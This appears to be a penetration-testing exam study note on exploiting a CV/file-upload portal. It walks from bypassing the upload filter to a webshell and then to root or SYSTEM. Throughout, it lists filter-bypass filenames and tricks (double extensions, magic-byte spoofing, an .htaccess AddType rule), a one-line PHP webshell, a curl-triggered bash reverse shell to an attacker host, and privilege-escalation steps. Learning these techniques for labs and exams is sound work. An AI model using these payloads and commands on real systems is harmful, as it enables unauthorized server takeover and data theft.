# 📤 Scenario 14 — File Upload Portal (CV upload → webshell)

> **Given:** a web app with a **file-upload feature** — e.g. a *"Job Application Portal — upload your CV here."* Goal: bypass the upload filter → webshell → foothold → root/SYSTEM. The upload **is** the attack surface. Fill `<placeholders>` from your own run, invent nothing.

Part of [[_MOC (Standalone Scenarios)]]. Method: [[Standalone Boxes — Exam Solve Guide]] · [[File Upload]]. Foothold: [[RCE]] · [[Shells]] · [[Web Exploitation]]. Also: [[SQL Injection]] · [[Linux Privilege Escalation]] · [[Windows Privilege Escalation]].

```bash
export IP=<TARGET_IP> ; mkdir -p loot
```

---

## 🧠 THE TWO QUESTIONS
A file upload becomes RCE when you answer both:
1. **Can I upload something executable?** (beat the filter — extension/content-type/magic-bytes)
2. **Where does it land, and is that path web-served & executable?** (find the upload dir)

> **Match the stack:** PHP server → `.php`/`.phtml` webshell; IIS/.NET → `.aspx`. Fingerprint first (`whatweb`), because an uploaded `.php` on IIS just downloads.

---

## 1️⃣ MAP THE UPLOAD
```bash
whatweb http://$IP/        # PHP vs IIS/ASP.NET
# upload a benign file, watch the response for the stored path/filename; then find the dir:
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php
#   chase: /uploads /cv /files /applications /documents /images
```
Note: is the filename **kept**, **renamed**, or **randomized**? (randomized → you need the response to leak the path.)

## 2️⃣ BYPASS THE FILTER (try in order)
```
plain:            shell.php            (always try first)
alt PHP exts:     shell.phtml .php3 .php4 .php5 .php7 .pht .phar .inc
double ext:       shell.php.jpg   shell.jpg.php
case:             shell.pHp  shell.PHP
trailing:         shell.php.   shell.php%20   shell.php::$DATA   (IIS)
content-type:     upload shell.php but set  Content-Type: image/jpeg
magic bytes:      prepend  GIF89a;   or  %PDF-1.5   before <?php ... ?>
.htaccess trick:  upload .htaccess  ->  AddType application/x-httpd-php .cv   then upload shell.cv
IIS:              shell.aspx .asp .ashx .cer .aspx;.jpg
```
Do this in **Burp Repeater** so you can tamper filename + `Content-Type` + body precisely. ([[File Upload]])

Minimal PHP shell:
```php
<?php system($_GET['c']); ?>
```

## 3️⃣ TRIGGER → SHELL
```bash
curl "http://$IP/uploads/shell.php?c=id"
# reverse shell:
curl "http://$IP/uploads/shell.php?c=$(python3 -c 'import urllib.parse;print(urllib.parse.quote("bash -c \"bash -i >& /dev/tcp/<KALI>/443 0>&1\""))')"
# listener: nc -lvnp 443   ([[Shells]])
```

## 4️⃣ IF THE UPLOAD IS AIRTIGHT
The portal has other inputs — don't tunnel on the upload:
- **Login** → SQLi auth bypass / default creds ([[SQL Injection]]).
- **Application ID / view CV** → IDOR / path traversal to read others' files.
- Identify the **product** → `searchsploit` ([[Web Exploitation]]).

## 5️⃣ FOOTHOLD → PRIVESC
```bash
# Linux: id; sudo -l; find / -perm -4000 -type f 2>/dev/null; ./linpeas.sh
# Windows/IIS: whoami /priv -> SeImpersonate -> GodPotato -> SYSTEM
```
→ [[Linux Privilege Escalation]] / [[Windows Privilege Escalation]].

## 🗺️ DECISION FLOW
```
upload feature ──► fingerprint stack ──► find upload dir
      ▼
upload webshell ──► blocked? ──► bypass (ext / double / content-type / magic / .htaccess)
      ▼                                   │ airtight
trigger over HTTP ──► RCE                 ▼
      ▼                        other bugs: SQLi login / IDOR / product CVE
privesc ──► ROOT/SYSTEM ✅
```

## 🚧 STUCK?
1. Upload OK but can't find it → the **response** or an `/uploads` listing leaks the name; fuzz the dir.
2. File stored but not executing → wrong **extension for the handler**; try `.phtml`/`.phar`; confirm it's under a **PHP-enabled** path.
3. Everything filtered → `.htaccess` (Apache) AddType trick, or pivot to the **login/IDOR**.
→ [[Standalone Boxes — Exam Solve Guide]] (Stuck section).

## 🧠 ONE-LINE LESSON
**A CV/file-upload portal is RCE when you (1) sneak an executable past the filter — alt extension, double extension, content-type/magic-byte spoof, or an `.htaccess` AddType — and (2) find the web-served upload dir to trigger it. Match the webshell to the stack (`.php` vs `.aspx`).**
